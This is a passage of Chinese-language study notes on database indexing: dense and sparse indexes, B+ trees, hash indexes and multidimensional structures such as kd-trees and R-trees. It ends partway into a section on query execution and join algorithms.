tabindex="-1">（2）索引的一般性特点</h4><li>索引文件是一种辅助存储结构，其存在不改变存储表的物理存储结构，但可以明显提高存储表的访问速度</li><li>索引文件组织方式有两种：<ol><li>排序索引文件：按索引字段值的某一种顺序组织存储</li><li>散列索引文件：依据索引字段值使用散列函数分配散列桶的方式存储</li></ol></li><li>主文件组织有 堆文件，排序文件，散列文件，聚簇文件等多种方式</li><li>在一个表上可以针对不同的属性值或属性组和建立不同的索引文件，可建立多个索引文件。索引字段的值可以是table中的任何一个属性的值或任何多个属性值的组合值</li><li>索引文件比主文件小很多，通过检索一个小的索引文件（可以全部装载进内存），快速定位后，再有针对性的读取非常大的主文件中的有关记录</li><li>有索引时，更新操作必须同步更新索引文件和主文件<h4 id="%EF%BC%883%EF%BC%89%E5%85%B3%E4%BA%8E%E7%B4%A2%E5%BC%95%E5%BA%94%E7%94%A8%E7%9A%84%E8%AF%84%E4%BB%B7%E9%97%AE%E9%A2%98" tabindex="-1">（3）关于索引应用的评价问题</h4></li><li>索引技术应用是检索效率大幅度提高，但同时也增加了存储空间，使维护负担加重</li><li>衡量索引性能好坏： 1 访问时间 2 插入时间 3 删除时间 4 空间负载 5 支持存取的有效比<h4 id="%EF%BC%884%EF%BC%89%E7%B4%A2%E5%BC%95%E7%9B%B8%E5%85%B3%E6%A6%82%E5%BF%B5%E7%9A%84%E5%8C%BA%E5%88%86" tabindex="-1">（4）索引相关概念的区分</h4></li><li>字段，排序字段，索引字段</li><li>码（Key），主码，又称表键---具有唯一性</li><li>排序码：对主文件进行排序存储的那些属性或属性组</li><li>索引码：即索引字段，不一定具有唯一性</li><li>搜索码：在主文件中查找记录的属性或属性集<h3 id="02-sql%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84%E7%B4%A2%E5%BC%95%E5%88%9B%E5%BB%BA%E4%B8%8E%E7%BB%B4%E6%8A%A4" tabindex="-1">02 SQL语言中的索引创建与维护</h3><p>书上没有，先跳了</p><h3 id="03-%E7%A8%A0%E5%AF%86%E7%B4%A2%E5%BC%95%E5%92%8C%E7%A8%80%E7%96%8F%E7%B4%A2%E5%BC%95" tabindex="-1">03 稠密索引和稀疏索引</h3><h4 id="%EF%BC%881%EF%BC%89%E7%A8%A0%E5%AF%86%E7%B4%A2%E5%BC%95%E5%92%8C%E7%A8%80%E7%96%8F%E7%B4%A2%E5%BC%95%E6%A6%82%E5%BF%B5" tabindex="-1">（1）稠密索引和稀疏索引概念</h4></li><li>对于一个主文件中的每一个记录（形成的每一个索引字段值），都有一个索引项和它对应，指明该记录所在位置。这样的索引称为稠密索引</li><li>对于主文件中的部分记录(形成的索引字段值)，有索引项和它对应，这样的索引称为 非稠密索引或稀疏索引<h4 id="%EF%BC%882%EF%BC%89%E7%A8%80%E7%96%8F%E7%B4%A2%E5%BC%95%E5%A6%82%E4%BD%95%E5%AE%9A%E4%BD%8D%E8%AE%B0%E5%BD%95" tabindex="-1">（2）稀疏索引如何定位记录</h4></li><li>索引文件中不存在搜索码的值，不代表主文件没有对应搜索码的记录</li><li>定位索引字段值为K的记录，需要<ol><li>首先找相邻的小于K的最大索引字段值对应的索引项</li><li>从该索引项对应的记录考试顺序进行table的检索</li></ol></li><li>稀疏索引的使用要求--主文件必须是按对应检索字段属性排序存储</li><li>相比稠密搜索：空间占用更少，维护任务更轻，但速度较慢</li><li>平衡：索引项不指向记录指针，而是指向记录所在存储块的指针，即每一个存储块有一个索引项，而不是每条记录有一个索引项<h4 id="%EF%BC%883%EF%BC%89-%E7%A8%A0%E5%AF%86%E7%B4%A2%E5%BC%95%E5%A6%82%E4%BD%95%E5%AE%9A%E4%BD%8D%E8%AE%B0%E5%BD%95" tabindex="-1">（3） 稠密索引如何定位记录</h4><p>候选键属性的稠密索引：先查索引，然后再根据索引读主文件。</p><p>非候选键属性的稠密索引：</p><p>第一种情况：索引文件中索引字段值是不重复的；主文件按检索字段排序且索引字段不是候选键。</p><p>第二种情况：索引文件中索引字段值有重复；主文件 未按索引字段排序且索引字段不是候选键。</p><p>第三种情况：引入指针桶处理非候选键索引的多记录情况；主文件未按检索字段排序且检索字段不是候选键。</p><h3 id="04-%E4%B8%BB%E7%B4%A2%E5%BC%95%E4%B8%8E%E8%BE%85%E5%8A%A9%E7%B4%A2%E5%BC%95" tabindex="-1">04 主索引与辅助索引</h3><h4 id="%EF%BC%881%EF%BC%89%E4%B8%BB%E7%B4%A2%E5%BC%95" tabindex="-1">（1）主索引</h4><p>主索引通常是每一存储块有一个索引项，索引项的总数和存储表所占的存储块数目相同，存储表的每一存储块的第一条记录，又称为锚记录，或者称为块锚。</p></li><li>主索引的索引字段值为块锚的索引字段值，而指针指向其所在的存储块</li><li>主索引是是按索引字段值进行排序的一个有序文件，通常建立在有序主文件的基于主码的排序字段上，即主索引的索引字段与主文件的主码有对应关系</li><li>主索引是稀疏索引<h4 id="%EF%BC%882%EF%BC%89-%E8%BE%85%E5%8A%A9%E7%B4%A2%E5%BC%95" tabindex="-1">（2） 辅助索引</h4><p>辅助索引是定义在主文件的任意或者多个非排序字段上的辅助存储结构。</p></li><li>辅助索引通常是对某一非排序字段上的每一个不同值有一个索引项；索引字段既是该字段的不同值，而指针则指向包含该纪录的块或该记录本身</li><li>当非排序字段为索引字段时，如果该字段值不唯一，则要采用一个类似链表的结构来保存包含该字段值的所有记录的位置</li><li>辅助索引是稠密索引，检索效率有时相当高<h4 id="%EF%BC%883%EF%BC%89%E5%B7%AE%E5%88%AB" tabindex="-1">（3）差别</h4></li><li>一个主文件只有一个主索引，但可以有多个辅助索引</li><li>主索引通常建立在主码/排序码上；辅助索引建立在其他属性上</li><li>可以利用主索引重新组织主文件数据，但辅助索引不能改变主文件数据</li><li>主索引是稀疏索引，辅助索引是稠密索引<h3 id="05-%E5%85%B6%E4%BB%96%E7%B4%A2%E5%BC%95" tabindex="-1">05 其他索引</h3><h4 id="%EF%BC%881%EF%BC%89%E8%81%9A%E7%B0%87%E7%B4%A2%E5%BC%95%E4%B8%8E%E9%9D%9E%E8%81%9A%E7%B0%87%E7%B4%A2%E5%BC%95" tabindex="-1">（1）聚簇索引与非聚簇索引</h4><p>聚簇索引：是指索引中邻近的记录在著文件中也是临近存储的<br>非聚簇索引：是指索引中邻近的记录在主文件中不一定是临近存储的</p><h4 id="%EF%BC%882%EF%BC%89%E5%80%92%E6%8E%92%E7%B4%A2%E5%BC%95" tabindex="-1">（2）倒排索引</h4><p>正排：一个文档包含了哪些词汇<br>倒排：一个词汇包含在哪些文档中</p><h4 id="%EF%BC%883%EF%BC%89%E5%85%B6%E5%AE%83%E7%B4%A2%E5%BC%95" tabindex="-1">（3）其它索引</h4></li><li>多级索引：当索引想比较多时，可以对索引再建立索引，形成多级索引。 常见多级索引有B树/B+树，以树形数据结构来组织索引项。</li><li>多属性索引：索引字段由table的多个属性值组合在一起形成的索引</li><li>散列索引：使用散列技术组织的索引</li><li>网格索引：使用多索引字段进行交叉联合定位与检索<h3 id="06-b%2B%E6%A0%91%E7%B4%A2%E5%BC%95%EF%BC%88%E4%B9%A6%E4%B8%8A%E6%98%AFb%E6%A0%91%EF%BC%89" tabindex="-1">06 B+树索引（书上是B树）</h3><h4 id="%EF%BC%881%EF%BC%89%E5%A4%9A%E7%BA%A7%E7%B4%A2%E5%BC%95" tabindex="-1">（1）多级索引</h4><p>当索引较多时，可以对索引再建立索引</p><h4 id="%EF%BC%882%EF%BC%89b%2B%E6%A0%91%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5" tabindex="-1">（2）B+树的基本概念</h4><p>B+树索引：一种以树形数据结构来组织索引项的多级索引</p><p>一块中索引项的组织：<br>Ki:索引字段值<br>Pj：指针，只想索引块或数据块或数据块中记录的指针</p><p>索引文件的叶子节点的指针指向主文件的数据块</p><p>B+树能自动保持与主文件大小相适应的树的层次，每个索引块指针的利用率都大于50%</p><h4 id="%EF%BC%883%EF%BC%89b%2B%E6%A0%91%E7%9A%84%E5%AD%98%E5%82%A8%E7%BA%A6%E5%AE%9A" tabindex="-1">（3）B+树的存储约定</h4><p>B+树有一个参数n，决定了树的所有存储块的状态</p></li><li>一块中有 n-1 个索引项（<索引字段值Ki，指针Pi>） + 1个指针（Pn）<p>示例： 存储块=4096B，整数型索引字段值=4B，指针=8B<br>则n应该满足 4（n-1) + 8n &lt; 4096,n取341为最大值</p><p>指针情况：</p><ul><li>索引字段值x在<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>k</mi><mrow><mi>i</mi><mo>−</mo><mn>1</mn></mrow></msub><mo>&lt;</mo><mi>x</mi><mo>&lt;</mo><msub><mi>k</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">k_{i-1}&lt;x&lt;k_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9028em;vertical-align:-0.2083em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>的由<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>p</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">p_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>指向；而<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>k</mi><mi>i</mi></msub><mo>&lt;</mo><mi>x</mi><mo>&lt;</mo><msub><mi>k</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">k_i&lt;x&lt;k_{i+1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9028em;vertical-align:-0.2083em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span></span></span></span></eq>的由<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>P</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">P_{i+1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8917em;vertical-align:-0.2083em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span></span></span></span></eq>指向 非叶节点指针指向索引块，叶子节点指向主文件的数据块或数据记录</li><li>叶子节点的最后一个指针始终指向其下一个数据块</li><li>一个索引块实际使用的索引指针个数d满足(n/2&lt;d&lt;n)</li><li>根节点至少两个指针被使用</li><li>索引字段值重复出现于叶节点和非叶子节点</li><li>指向主文件的指针仅出现在叶子节点</li><li>所有叶子节点即可覆盖所有键值的索引</li><li>索引字段值在叶子节点中是按顺序排列的</li></ul><p>B+树级数相同–平衡，如何保证？</p><ul><li>插入删除记录时，伴随着节点的分裂和合并</li><li>分裂和合并将调整部分节点块中的索引项，需要算法支持</li></ul><h4 id="(4)-%E5%88%A9%E7%94%A8b%2B%E6%A0%91%E5%BB%BA%E7%AB%8B%E4%B8%8D%E5%90%8C%E7%9A%84%E7%B4%A2%E5%BC%95" tabindex="-1">(4) 利用B+树建立不同的索引</h4><p>1： 利用B+树建立键属性稠密索引<br>索引字段是主文件的主键，索引是稠密的。主文件可以按逐渐排序，也可以不按逐渐排序。指针指向的是记录<br>2： 利用B+树建立键属性稀疏索引<br>索引字段是主文件的逐渐，索引是稀疏的。主文件必须按逐渐排序。指针指向的是数据块。</p><h4 id="%EF%BC%885%EF%BC%89-b%E6%A0%91" tabindex="-1">（5） B树</h4><p>不同：</p><ul><li>索引字段值仅出现一次</li><li>主文件的指针也可出现在非叶子节点</li><li>所有节点才能覆盖所有的键值索引</li><li>分裂新增节点原理相似，细节不一样</li></ul><h4 id="%EF%BC%886%EF%BC%89-b%2B%E6%A0%91%E7%9B%B8%E5%85%B3%E7%AE%97%E6%B3%95" tabindex="-1">（6） B+树相关算法</h4><p>检索算法，增加记录的算法，删除记录的算法</p><h3 id="07-b%2B%E6%A0%91%E4%B9%8B%E9%94%AE%E5%80%BC%E6%8F%92%E5%85%A5%E4%B8%8E%E8%8A%82%E7%82%B9%E5%88%86%E8%A3%82%E7%A4%BA%E6%84%8F" tabindex="-1">07 B+树之键值插入与节点分裂示意</h3><h4 id="%EF%BC%881%EF%BC%89-%E6%8F%92%E5%85%A5" tabindex="-1">（1） 插入</h4><p>关键：</p><ol><li>分裂（当插入节点全满时）</li><li>由叶子节点向根节点逐层处理<br>能够自动保持与主文件大小相适应的书的层次<br>每个索引块的指针利用率可以在50%以上</li><li>指针调整</li></ol><h4 id="%EF%BC%882%EF%BC%89-%E5%88%A0%E9%99%A4" tabindex="-1">（2） 删除</h4><ol><li>先定位待删除键值的叶子节点，从根节点向下</li><li>删除键值及其主文件记录</li><li>如指针数目不小于规定数目，则可以结束；否则，需要合并。<ol><li>从相邻节点能否转移一些键值到该节点，如果可以，则转移，并更新父节点的相应键值</li><li>否则考虑节点合并，合并后调整父节点的键值及次序，调整叶子节点的指针链接</li><li>如果父节点在删除索引项及指针后，指针数目小于规定，则继续步骤2，直至根节点；如果不小于规定则结束</li></ol></li><li>如果删除位置是第一个，还需更新父节点键值</li></ol><h3 id="08-%E6%95%A3%E5%88%97%E7%B4%A2%E5%BC%95" tabindex="-1">08 散列索引</h3><h4 id="%EF%BC%881%EF%BC%89-%E6%95%A3%E5%88%97%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5" tabindex="-1">（1） 散列的基本概念</h4><p>由m个桶，每个桶是具有相同容量的存储地，称为主桶，溢出后可设置溢出桶<br>散列函数h（k），可以将键值k映射到{0,1,…m-1}中的某一个值<br>将具有键值k的记录Record（k）存储到对应的h（k）编号的桶中（此处映射应尽可能均匀）</p><h4 id="%EF%BC%882%EF%BC%89%E6%95%A3%E5%88%97%E7%B4%A2%E5%BC%95" tabindex="-1">（2）散列索引</h4><ul><li>内存数据可采用散列确定存储页，主文件可采用散列确定存储块，索引亦可用散列确定散列项的存储块</li><li>m个桶，一个桶可以是一个存储块，也可以是连续存储块</li></ul><h4 id="%EF%BC%883%EF%BC%89-%E6%95%A3%E5%88%97%E7%B4%A2%E5%BC%95%E7%9A%84%E6%8F%92%E5%85%A5%E5%92%8C%E5%88%A0%E9%99%A4" tabindex="-1">（3） 散列索引的插入和删除</h4><p>插入键值d的索引项：</p><ol><li>计算h（d）=2</li><li>如2号桶有空间，则将索引项d插入2号桶</li><li>如没空间，则申请一溢出桶，插入d</li></ol><p>删除键值f的索引项：</p><ol><li>计算h（f）=2</li><li>删除2号桶中的键值f</li><li>将溢出桶中的值放入主桶，删除溢出桶</li></ol><h4 id="%EF%BC%884%EF%BC%89%E6%95%A3%E5%88%97%E7%9A%84%E9%97%AE%E9%A2%98" tabindex="-1">（4）散列的问题</h4><p>散列索引的目标：最好是没有溢出桶，每一个散列值仅有一个桶。读写每一个键值都只写一个存储块。</p><ul><li>均匀分布如何做到？</li><li>桶的数目m如何确定？</li></ul><p>如果桶数m固定----静态散列索引<br>   如果m过大，则浪费，过小则产生更多溢出桶，增加索引检索时间<br>桶的数目随键值增多动态增加—动态散列索引<br>   </p><h3 id="09-%E5%8F%AF%E6%89%A9%E5%B1%95%E6%95%A3%E5%88%97%E7%B4%A2%E5%BC%95%E4%B8%8E%E7%BA%BF%E6%80%A7%E6%95%A3%E5%88%97%E7%B4%A2%E5%BC%95" tabindex="-1">09 可扩展散列索引与线性散列索引</h3><p>先略过，书上有，开卷考现场学来得及</p><p>以下第三章书上有，视频里没有</p><h3 id="10-%E5%A4%9A%E7%BB%B4%E7%B4%A2%E5%BC%95%EF%BC%883.4%EF%BC%89" tabindex="-1">10 多维索引（3.4）</h3><p>多维索引的应用：对地理数据的处理。</p><p>利用传统索引执行范围查询，效果甚微，如果数据小点还可以。</p><p>大多数支持多维数据查询的数据结构归于以下两类</p><ol><li>类散列表方式</li><li>类树方式</li></ol><h3 id="11-%E5%A4%9A%E7%BB%B4%E6%95%B0%E6%8D%AE%E7%9A%84%E6%95%A3%E5%88%97%E7%BB%93%E6%9E%84" tabindex="-1">11 多维数据的散列结构</h3><h4 id="%EF%BC%881%EF%BC%89%E7%BD%91%E6%A0%BC%E6%96%87%E4%BB%B6" tabindex="-1">（1）网格文件</h4><p>一种比单维索引性能好的最简单的数据结构。在每一维上用网格线将空间分成条状，被分成的每个区域可以看成是散列表的一个桶，以此来进行插入和删除.</p><h4 id="%EF%BC%882%EF%BC%89%E5%88%86%E6%AE%B5%E6%95%A3%E5%88%97%E5%87%BD%E6%95%B0" tabindex="-1">（2）分段散列函数</h4><p>散列函数可以接受属性值的一个列表作为参数，以此可以将高维转换到一维。</p><p>这种方法其实在最近邻查询和范围查询中没什么用，点之间的物理距离没有通过桶号反应，否则就是网格文件了。</p><h3 id="12-%E5%A4%9A%E7%BB%B4%E6%95%B0%E6%8D%AE%E7%9A%84%E6%A0%91%E7%BB%93%E6%9E%84" tabindex="-1">12 多维数据的树结构</h3><h4 id="%EF%BC%881%EF%BC%89%E5%A4%9A%E9%94%AE%E7%B4%A2%E5%BC%95" tabindex="-1">（1）多键索引</h4><p>一种简单的树模式，它的每一层的节点是一个属性的索引。</p><p>性能：<br>部分匹配查询：如果属性可以按树的从浅到深的属性索引给出，效率很高，否则很低。<br>范围查询：单个索引在他们本身支持范围查询，效果很好<br>最近邻查询：即为若干个范围查询</p><h4 id="%EF%BC%882%EF%BC%89kd-%E6%A0%91" tabindex="-1">（2）kd-树</h4><h5 id="kd%E6%A0%91%E6%A6%82%E5%BF%B5" tabindex="-1">kd树概念</h5><p>kd树（k维搜索树）是把二叉搜索树推广到多维数据的一种主存数据结构。</p><p>kd树是一个二叉树，它的内部节点有一个相关联的属性a和一个值V，它将数据点集分为两个部分：左子树是a值小于V的部分，右子树是a值大于等于V的部分。<br>并增加以下定义：</p><ol><li>内部节点只有一个属性，该属性具有一个划分值和指向左右子树的指针</li><li>叶子节点是块，快空间存放着尽可能多的记录</li></ol><h5 id="kd%E6%A0%91%E6%93%8D%E4%BD%9C" tabindex="-1">kd树操作</h5><p>查找：同二叉树</p><p>插入：先做一个查找，找到对应的叶子节点，如果叶子节点中的块还有空间，就将新的数据放在那里；否则将块分裂成两个，并根据所在层属性再次划分。最后，我们创建了一个新的内部节点：它的子节点分别为我们分裂得到的两个新块，并且给该内部节点一个相应的划分值。</p><h5 id="kd%E6%A0%91%E4%BC%98%E5%8C%96" tabindex="-1">kd树优化</h5><ol><li>内部节点多分支。kd树内部节点可以有多个键-指针对，让其更像B树节点。</li><li>聚集内部节点到块。可以把多个内部节点压缩到一个块中，减少遍历路径访问的块的数量。</li></ol><h4 id="%EF%BC%883%EF%BC%89%E5%9B%9B%E5%8F%89%E6%A0%91" tabindex="-1">（3）四叉树</h4><p>在四叉树中，每个内部节点对应于二维空间中的一个正方形区域，或是k维空间的k维立方体。在二维的情况，一个节点的子节点即为它二维平面的四个象限。</p><h4 id="%EF%BC%884%EF%BC%89r-%E6%A0%91" tabindex="-1">（4）R-树</h4><p>R树是一种利用B-树的某些本质特征来处理多维数据的数据结构。</p><p>R树表示由二维或更高维区域组成的数据，我们把它称为数据区，R树的一个内部节点对应于某个内部区域，运行子区域有重叠，但应尽量小。</p><h3 id="13-%E4%BD%8D%E5%9B%BE%E7%B4%A2%E5%BC%95" tabindex="-1">13 位图索引</h3><p>略，看书，考场现编</p><h2 id="%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E6%9F%A5%E8%AF%A2%E6%89%A7%E8%A1%8C" tabindex="-1">第四章 查询执行</h2><h3 id="1901-%E6%9F%A5%E8%AF%A2%E5%AE%9E%E7%8E%B0%E7%AE%97%E6%B3%95%E6%A6%82%E8%BF%B0" tabindex="-1">1901 查询实现算法概述</h3><h4 id="%EF%BC%881%EF%BC%89%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9F%A5%E8%AF%A2%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%80%9D%E6%83%B3" tabindex="-1">（1）数据库查询的基本思想</h4><p>基本动作：</p><ul><li>关系模型的基本运算<ul><li>并，差，积，选择，投影</li></ul></li></ul><p>用户语言实现关系模型基本元素的基本组合，随后数据库管理系统（程序执行机构）解释这种组合，并按次序调用基本动作予以执行</p><h4 id="%EF%BC%882%EF%BC%89%E6%9F%A5%E8%AF%A2%E5%AE%9E%E7%8E%B0-vs.-%E6%9F%A5%E8%AF%A2%E4%BC%98%E5%8C%96" tabindex="-1">（2）查询实现 vs. 查询优化</h4><p>SQL语句 经过编译 得到关系代式；<br>关系代式先经过逻辑优化；<br>在经过物理优化（为每一个关系代数才做选择优化的执行例行程序，形成物理查询计划）；<br>最后经过执行引擎运行（依物理查询计划调用的例行程序进行处理，并返回结果）</p><h4 id="%EF%BC%883%EF%BC%89-%E6%9F%A5%E8%AF%A2%E7%AE%97%E6%B3%95%E6%80%BB%E8%A7%88" tabindex="-1">（3） 查询算法总览</h4><ul><li>数据库的三大类操作<ul><li>以此单一元组的一元操作<ul><li>选择，投影</li></ul></li><li>整个关系的一元操作<ul><li>去重，group by，排序</li></ul></li><li>整个关系的二元操作<ul><li>集合的并交差</li><li>包的并交差</li><li>积，连接</li></ul></li></ul></li></ul><h3 id="1902-%E8%BF%9E%E6%8E%A5%E6%93%8D%E4%BD%9C%E7%9A%84%E5%AE%9E%E7%8E%B0%E7%AE%97%E6%B3%95" tabindex="-1">1902 连接操作的实现算法</h3><h4 id="%EF%BC%881%EF%BC%89%E8%BF%9E%E6%8E%A5%E6%93%8D%E4%BD%9C%E7%9A%84%E9%80%BB%E8%BE%91%E5%AE%9E%E7%8E%B0%E7%AE%97%E6%B3%95" tabindex="-1">（1）连接操作的逻辑实现算法</h4><p>两个for循环即可</p><h4 id="%EF%BC%882%EF%BC%89%E8%BF%9E%E6%8E%A5%E6%93%8D%E4%BD%9C%E7%9A%84%E7%89%A9%E7%90%86%E5%AE%9E%E7%8E%B0%E7%AE%97%E6%B3%95" tabindex="-1">（2）连接操作的物理实现算法</h4><p>关系是存储在磁盘上的，磁盘是以磁盘块为操作单位的，首先要装载进内存(I/O操作)，然后在进行元组的处理</p><ul><li>一些参数<ul><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>T</mi><mi>R</mi></msub></mrow><annotation encoding="application/x-tex">T_R</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.00773em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>：关系R的元组数目</li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>B</mi><mi>R</mi></msub></mrow><annotation encoding="application/x-tex">B_R</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.00773em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>：关系R的磁盘数目</li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span></eq>：主存缓冲区的页数（主存每页容量等于一个磁盘的容量）</li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>I</mi><mi>R</mi></msub></mrow><annotation encoding="application/x-tex">I_R</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.00773em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>：关系R的每个元组的字节数</li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi></mrow><annotation encoding="application/x-tex">b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">b</span></span></span></span></eq>：每个磁盘的字节数</li></ul></li></ul><p>需要错做的Byte数<eq><span class="katex"><span class="katex-mathml"><math 